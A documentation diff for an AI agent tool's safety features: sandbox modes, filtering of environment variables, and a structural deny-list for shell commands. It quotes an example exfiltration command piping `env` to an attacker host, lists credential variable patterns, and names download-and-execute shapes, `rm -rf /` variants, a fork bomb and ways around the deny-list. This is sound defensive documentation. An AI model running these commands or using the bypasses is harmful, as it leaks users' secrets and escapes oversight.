@@ -20,7 +20,7 @@ The policy evaluates rules in this order — **hard gates first, soft approval l
 4. **Read-only allowlist** — `read_only_paths` glob patterns that grant **reads only** (never writes); checked after denied paths, so credential patterns still win (hard allow)
 5. **Allowed paths** — if set, only matching paths are permitted; anything outside is denied (hard)
 6. **Command rules** — explicit `CommandRule` entries for shell commands (first match wins) (hard)
-7. **Denied commands** — substring patterns that block dangerous shell commands (hard)
+7. **Denied commands** — token patterns (`denied_commands`) plus regexes (`denied_command_patterns`) that block dangerous shell commands (hard, best-effort — see [Command deny-list](#command-deny-list))
 8. **Bash forced approval** — if `allowed_paths` is set and the sandbox provides no OS-level write isolation (`local`, `wsl`), bash is forced to ASK so the user can verify the command (soft)
 9. **Approval requirements** — if `require_approval_for_writes` or `require_approval_for_execute` is set, matching tools return ASK (soft)
 10. If nothing matches, the tool call is **ALLOWED**
@@ -448,7 +448,19 @@ cheap last-line check, not a replacement for a real FS sandbox.
 }
 ```
 
-`aar init` writes built-in profiles to `~/.aar/distros/`. Point `profile` at one and `aar sandbox setup` picks up everything — rootfs URL, packages, pre-install commands, and the system-prompt description the model sees. All `wsl` fields set alongside `profile` override the profile value for that key.
+`aar init` writes built-in profiles to `~/.aar/distros/`. Point `profile` at one and `aar sandbox setup` picks up everything — rootfs URL, checksum, packages, pre-install commands, and the system-prompt description the model sees.
+
+> **Only `null` defers to the profile.** Every other inline `wsl` value overrides
+> it — including `""` and `[]`. A config that keeps the sample's Alpine defaults
+> (`"rootfs_url": "…alpine…"`, `"packages": ["python3", "py3-pip"]`,
+> `"package_install_command": "apk add …"`, `"system_prompt_hint": ""`) while
+> pointing `profile` at `ubuntu.json` will download an Alpine rootfs, try to
+> install with `apk`, and tell the model nothing about the distro — and because
+> the profile's `rootfs_sha256` no longer matches the overridden URL,
+> `aar sandbox setup` aborts on a checksum mismatch. When you use a profile,
+> delete the provisioning keys from `config.json` and let the profile own them.
+>
+> Run `aar sandbox status` to see the values actually in effect after the merge.
 
 You can also configure the distro inline without a profile:
 
@@ -549,7 +561,13 @@ Selection logic:
 
 ### `local` — no sandbox
 
-Direct subprocess execution with no restrictions — inherits the full parent environment and user permissions. This is the default and the right choice for trusted local development.
+Direct subprocess execution with no process isolation. This is the default and
+the right choice for trusted local development.
+
+The child environment *is* restricted, though: since the credential-leak fix,
+`local` uses the same allow-list as the `linux` and `windows` modes instead of
+handing the model's shell every variable you exported. See
+[Environment variables in the sandbox](#environment-variables-in-the-sandbox).
 
 ```json
 {
@@ -558,6 +576,76 @@ Direct subprocess execution with no restrictions — inherits the full parent en
   }
 }
 ```
+
+### Environment variables in the sandbox
+
+A shell the model controls should not be able to run
+`env | curl -d @- https://attacker/`. Two independent filters apply in **every**
+sandbox mode:
+
+1. **Allow-list** (`allowed_env_vars`) — only these names are copied from the
+   parent environment. Entries are case-insensitive globs. The default covers
+   `PATH`, `HOME`, `TERM`, `LANG`, `LC_*`, `TMPDIR`/`TMP`/`TEMP`, `USER`,
+   `SHELL` plus the Windows essentials (`SYSTEMROOT`, `COMSPEC`, …) a process
+   needs to start at all.
+2. **Deny-list** (`safety.sandbox.env_denylist_patterns`) — applied *after* the
+   allow-list, and also when `restricted_env` is off. Defaults to
+   `["*_API_KEY", "*_TOKEN", "*SECRET*", "*PASSWORD*", "AWS_*",
+   "GOOGLE_APPLICATION_CREDENTIALS"]`, so widening `allowed_env_vars` (or
+   inheriting the full environment) still doesn't hand over provider keys.
+
+```json
+{
+  "safety": {
+    "sandbox": {
+      "mode": "local",
+      "env_denylist_patterns": ["*_API_KEY", "*_TOKEN", "*SECRET*"],
+      "local": {
+        "restricted_env": true,
+        "allowed_env_vars": ["PATH", "HOME", "LANG", "MY_BUILD_VAR"]
+      }
+    }
+  }
+}
+```
+
+Set `"env_denylist_patterns": []` **and** `"restricted_env": false` to
+deliberately hand the full environment, credentials included, to the model.
+
+Environment variables passed programmatically to `Sandbox.execute(env=...)` come
+from the host application rather than the model, so they are merged in
+unfiltered.
+
+### Command deny-list
+
+`denied_commands` is matched structurally, not by substring:
+
+- The command is split into **simple commands** on `;`, `&&`, `||`, `|`, `&`
+  and newlines — every one of them is checked, not just the first.
+- Known wrappers are stripped (`sudo`, `doas`, `env FOO=bar`, `nohup`, `time`,
+  `nice`, `ionice`, `xargs`, `command`, `exec`, `busybox`, `stdbuf`, `setsid`,
+  `timeout`), so `sudo shutdown` is treated as `shutdown`.
+- `sh -c '<command>'` (and `bash`/`zsh`/`dash`/`ksh`/`ash`) is expanded one
+  level, up to a depth of 4.
+- `rm` flags are normalised, so `rm -fr /`, `rm -r -f /` and
+  `rm --recursive --force /` all match the `rm -rf /` entry.
+- A single-token entry also matches the dotted tool family, so `mkfs` catches
+  `mkfs.ext4`.
+
+Shapes that involve shell metacharacters live in
+`safety.denied_command_patterns` (regexes matched case-insensitively against the
+raw command line). The defaults cover download-and-execute (`curl … | sh`,
+`wget … | sudo bash`, …) and the classic fork bomb.
+
+| Field | Type | Default | Description |
+|-------|------|---------|-------------|
+| `safety.denied_commands` | `list[str] \| None` | `None` (→ built-in list) | Token patterns; a list **replaces** the defaults, `[]` disables them |
+| `safety.denied_command_patterns` | `list[str] \| None` | `None` (→ built-in list) | Regexes against the raw command line; `[]` disables them |
+
+**This is a guardrail, not a boundary.** A verb hidden inside a non-shell
+interpreter (`python -c '…'`, `perl -e '…'`) or assembled at runtime from string
+fragments will get through. Keep `require_approval_for_execute` on, or run under
+an isolating sandbox mode, if you need a real limit.
 
 ### Sandbox configuration reference
 
@@ -568,10 +656,18 @@ Direct subprocess execution with no restrictions — inherits the full parent en
 | Field | Type | Default | Description |
 |-------|------|---------|-------------|
 | `mode` | `str` | `"local"` | Active mode: `local` \| `linux` \| `windows` \| `wsl` \| `auto` |
-| `local` | `LocalSandboxConfig` | — | Settings for `local` mode (no options) |
+| `env_denylist_patterns` | `list[str] \| None` | `None` (→ built-in list) | Variable-name globs stripped in **every** mode, even when `restricted_env` is off. `[]` disables. |
+| `local` | `LocalSandboxConfig` | — | Settings for `local` mode |
 | `linux` | `LinuxSandboxConfig` | — | Settings for `linux` mode |
 | `windows` | `WindowsSandboxConfig` | — | Settings for `windows` mode |
 | `wsl` | `WslSandboxConfig` | — | Settings for `wsl` mode |
+
+**`LocalSandboxConfig`:**
+
+| Field | Type | Default | Description |
+|-------|------|---------|-------------|
+| `restricted_env` | `bool` | `true` | Pass only allow-listed environment variables to the shell |
+| `allowed_env_vars` | `list[str] \| None` | `None` (→ built-in list) | Case-insensitive globs of variable names to inherit |
 
 **`LinuxSandboxConfig`:**
 
